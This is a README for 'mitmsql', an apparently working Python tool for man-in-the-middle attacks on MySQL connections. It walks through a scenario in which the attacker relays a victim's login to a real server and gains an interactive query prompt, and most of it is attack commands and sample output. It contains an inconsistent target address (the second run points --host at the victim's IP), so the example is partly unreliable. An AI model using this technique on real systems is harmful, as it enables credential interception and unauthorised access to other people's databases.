# mitmsql
Man in the Middle Attack for MySQL.

# Example

## Situation
- MySQL Server is running at `192.168.0.1`.
- MITMySQL Server (this script) will listen 0.0.0.0:3306 (*you can change this with `--lport` option*) at `192.168.0.2`.
- A victim (client) will connect to MITMySQL Server (this script) = `192.168.0.2`.
  - he has the credential for valid MySQL server `192.168.0.1`.

## How it works.
The attacker run this script at `192.168.0.2`.
```
$ python mitmysql.py --host 192.168.0.1
[*] WAITING FOR CLIENT...
```

The victim will connect to `192.168.0.2` from `192.168.0.3`, and input his password.
```
mysql -h 192.168.0.2 -p
```

When the authentication succeeded, the attacker will see the interpreter and he can execute queries to `192.168.0.1`.
```
$ python mitmysql.py --host 192.168.0.3
[*] WAITING FOR CLIENT...
[*] CONNECTED BY: ('192.168.0.3', 64600)
[+] GOT SERVER INFORMATION: 5.5.5-10.1.23-MariaDB-9+deb9u1
[+] AUTHENTICATION SUCCEEDED
>  show databases
(('information_schema',), ('mysql',), ('performance_schema',))
> use information_schema
()
>
```
